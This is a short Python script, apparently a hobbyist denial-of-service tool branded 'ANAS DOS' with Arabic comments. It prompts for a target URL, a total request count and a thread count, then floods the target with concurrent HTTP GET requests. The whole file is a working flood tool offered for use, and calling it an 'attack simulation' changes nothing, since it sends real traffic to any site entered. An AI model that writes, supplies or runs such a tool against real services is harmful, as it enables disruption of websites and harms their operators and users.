import requests
import threading
import os

def send_requests(url, num):
    for _ in range(num):
        try:
            response = requests.get(url)
            print(f"[+] Request sent to {url} | Status: {response.status_code}")
        except requests.exceptions.RequestException:
            print("[-] Error sending request")

def main():
    os.system("clear")
    print('''
    \033[91m 
     █████╗ ███╗   ██╗ █████╗ ███████╗    ██████╗  ██████╗ ███████╗
    ██╔══██╗████╗  ██║██╔══██╗██╔════╝    ██╔══██╗██╔═══██╗██╔════╝
    ███████║██╔██╗ ██║███████║███████╗    ██║  ██║██║   ██║███████╗						Anass Labrini
    ██╔══██║██║╚██╗██║██╔══██║╚════██║    ██║  ██║██║   ██║╚════██║
    ██║  ██║██║ ╚████║██║  ██║███████║    ██████╔╝╚██████╔╝███████║
    ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚══════╝
    \033[0m
''')                                                           



    # مدخلات المستخدم
    url = input(" Enter target URL: ").strip()
    if not url.startswith("http"):
        print("[✘] Invalid URL. Must start with http:// or https://")
        return

    try:
        total_requests = int(input("[+] Total number of requests to send: "))
        num_threads = int(input("[+] Number of threads to use: "))
    except ValueError:
        print("[✘] Please enter valid numbers.")
        return

    # حساب عدد الطلبات لكل thread
    requests_per_thread = total_requests // num_threads

    print(f"\n[~] Sending {total_requests} requests using {num_threads} threads...\n")

    threads = []

    for _ in range(num_threads):
        thread = threading.Thread(target=send_requests, args=(url, requests_per_thread))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print("\n[✓] Attack simulation complete.")

if __name__ == "__main__":
    main()
